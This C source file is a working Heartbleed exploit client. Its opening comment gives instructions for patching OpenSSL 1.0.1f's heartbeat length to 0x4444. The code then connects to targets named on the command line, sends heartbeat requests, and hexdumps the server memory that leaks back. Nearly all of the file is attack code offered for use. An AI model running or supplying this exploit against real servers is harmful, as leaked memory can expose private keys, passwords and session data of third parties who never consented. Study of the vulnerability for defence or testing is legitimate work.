/*
    This program requires you to use a "hacked" version of the OpenSSL lib
    in order to do the hearbleed attack.

    First go to the file "openssl-1.0.1f/ssl/t1_lib.c" to line 2671 and
    make the following change
- 	s2n(payload, p);
+	s2n(0x4444, p);

    I chose the number 0x4444 here, it's the amount of heartbleed information
    that will returned.

    Once you've made that change, recompile OpenSSL, and link this code to
    it. If you don't make this change, then all this code will do is make
    a perfectly normal/legal heartBEAT instead of heartBLEED.

*/
#define _CRT_SECURE_NO_WARNINGS 1
#if defined(WIN32)
#include <WinSock2.h>
#endif

#include <openssl/bio.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <stdio.h>

#if defined(_MSC_VER)
#pragma comment(lib, "ws2_32")
#pragma comment(lib, "libeay32.lib")
#pragma comment(lib, "ssleay32.lib")
#endif

struct DumpArgs {
    const char *target_string;
    unsigned is_heartbeat_seen;
};

/****************************************************************************
 * This is the "callback" that receives the hearbeat data
 ****************************************************************************/
void 
dump_bytes(int write_p, int version, int content_type,
            const void *vbuf, size_t len, SSL *ssl, 
            void *arg)
{
    struct DumpArgs *dumpargs = (struct DumpArgs*)arg;
    const unsigned char *buf = (const unsigned char *)vbuf;
    size_t i;

    /* make sure this is heartbeat data */
    if (content_type != TLS1_RT_HEARTBEAT) {
        fprintf(stderr, "msg_callback:%u: unknown type seen\n", content_type);
        return;
    }

    /* Print which target we got it from */
    if (dumpargs) {
        printf("\"%s\" %u-bytes\n", dumpargs->target_string, (unsigned)len);
    }

    /*
     * Print a standard hexdump of the bytes
     */
    for (i=0; i<len; i += 16) {
        size_t j;

        printf("%04x ", i);
        for (j=i; j<len && j<i+16; j++) {
            printf("%02x ", buf[j]);
        }
        for ( ; j<i+16; j++)
            printf("   ");

        for (j=i; j<len && j<i+16; j++) {
            if (isprint(buf[j]) && !isspace(buf[j]))
                printf("%c", buf[j]);
            else
                printf(".");
        }
        printf("\n");
    }

    /* Tell the main program that they can now stop listening for
     * incoming data */
    dumpargs->is_heartbeat_seen = 1;
}

/****************************************************************************
 ****************************************************************************/
void 
openssltest(const char *target_string)
{
    SSL_CTX* ctx;
    SSL* ssl;
    BIO* bio;
    struct DumpArgs dumpargs;
    time_t start;

    dumpargs.target_string = target_string;
    dumpargs.is_heartbeat_seen = 0;

    /*
     * Setup a new context
     */
    ctx = SSL_CTX_new(SSLv23_client_method());

    /*
     * Setup the underlying/unencrypted basic socket input/output
     */
    bio = BIO_new_ssl_connect(ctx);
    if (bio == NULL) {
        printf("Error creating BIO!\n");
        ERR_print_errors_fp(stderr);
        SSL_CTX_free(ctx);
        return;
    }

    /*
     * Setup the SSL abstraction on top of the basic I/O
     */
    BIO_get_ssl(bio, &ssl);
    SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);


    /*
     * connect to the target
     */
    BIO_set_conn_hostname(bio, target_string);
    if (BIO_do_connect(bio) <= 0) {
        fprintf(stderr, "%s: connection failed\n", target_string);
        BIO_free_all(bio);
        SSL_CTX_free(ctx);
        return;
    }

    /*
     * Do the SSL handashake
     */
    if (BIO_do_handshake(bio) <= 0) {
        fprintf(stderr, "%s: SSL handshake failed\n", target_string);
        BIO_free_all(bio);
        SSL_CTX_free(ctx);
        return;
    }

    /*
     * Send the hearbeat request
     */
    SSL_ctrl(ssl, SSL_CTRL_TLS_EXT_SEND_HEARTBEAT, 0, 0);
    
    /*
     * Configure callbacks into the OpenSSL libraries to peak on the hearbeat
     * data, because there is no normal API to get it.
     */
    SSL_set_msg_callback(ssl, dump_bytes);
    SSL_set_msg_callback_arg(ssl, (void*)&dumpargs);

    /*
     * Now wait 10 seconds to get the response
     */
    start = time(0);
    while (start + 10 >= time(0) && !dumpargs.is_heartbeat_seen) {
        unsigned char buf[1024];
        int x;
        
        /*
         * Do a "read" request. We aren't expecting to read anything, but this
         * runs through the SSL stack to process the hearbeat response
         */
        x = BIO_read(bio, buf, sizeof(buf) - 1);
        if (x == 0) {
            /* normal end of a TCP connection, like a FIN */
            break;
        } else if (x < 0) {
            /* error, like a reset, probably because the other side got tired waiting */
            if (!BIO_should_retry(bio)) {
                goto end;
            }
        } else {
            /* got some data, probably an error message from the server, but we
             * don't care */
            continue;
        }
    }

end:

    /*
     * Clean up the resources so that we don't have a memory leak for lots of
     * machines
     */
    BIO_free_all(bio);
    SSL_CTX_free(ctx);
}


/****************************************************************************
 ****************************************************************************/
int
main(int argc, char *argv[])
{
    int i;

    if (argc <=1 ) {
        printf("usage:\n heartbleed <target1:port> <target2:port> ...\n");
        return 1;
    }

    /*
     * If Windows, do this stupid step. OMFG it's been decades Microsoft why
     * do you still require this????!!????
     */
#if defined(WIN32)
    {WSADATA x; WSAStartup(0x101,&x);}
#endif

    /*
     * Do all the OpenSSL program initialization steps
     */
    CRYPTO_malloc_init();
    SSL_library_init();
    SSL_load_error_strings();
    ERR_load_BIO_strings();
    OpenSSL_add_all_algorithms();

    /*
     * Send requests to all the targets
     */
    for (i=1; i<argc; i++) {
       openssltest(argv[i]);
    }

   return 0;
}

